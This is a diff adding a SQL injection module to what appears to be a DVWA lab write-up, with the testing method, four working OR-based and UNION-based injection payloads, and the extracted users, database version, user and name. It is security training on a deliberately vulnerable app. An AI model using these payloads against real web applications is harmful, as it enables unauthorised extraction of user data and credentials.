@@ -135,7 +135,44 @@ exploit used in the 2017 WannaCry ransomware attack.
 - File Inclusion
 - Brute Force
 
+---
 
+### Module 1 — SQL Injection
+- **Date:** 14/05/2026
+- **Target:** DVWA SQL Injection module
+- **Security Level:** Low
+
+#### What is SQL Injection?
+SQL Injection is a web vulnerability that allows an attacker to interfere with the queries an application makes to its database. By inserting malicious SQL code into an input field, an attacker can bypass authentication, extract sensitive data, or even take full control of the database.
+
+#### Testing Methodology
+1. Confirmed normal behaviour by entering User ID: 1
+2. Tested for vulnerability using a single quote '
+3. Used OR-based injection to dump all users
+4. Used UNION-based injection to extract database information
+
+#### Payloads Used
+- `%' or '0'='0` — Dumped all users from the database
+- `%' or 0=0 union select null, version() -- -` — Extracted database version
+- `%' or 0=0 union select null, user() -- -` — Extracted database username
+- `%' or 0=0 union select null, database() -- -` — Extracted database name
+
+#### Results
+| Data Extracted | Value |
+|---|---|
+| All users | admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith |
+| Database version | MariaDB 11.8.1 |
+| Database username | dvwa@localhost |
+| Database name | dvwa |
+
+#### Evidence
+- screenshots/sqli-all-users.png
+- screenshots/sqli-db-version.png
+- screenshots/sqli-db-user.png
+- screenshots/sqli-db-name.png
+
+#### Impact
+A real world attacker could use these techniques to extract sensitive customer data, credentials, or financial information from any database connected to a vulnerable web application.
 
 
 
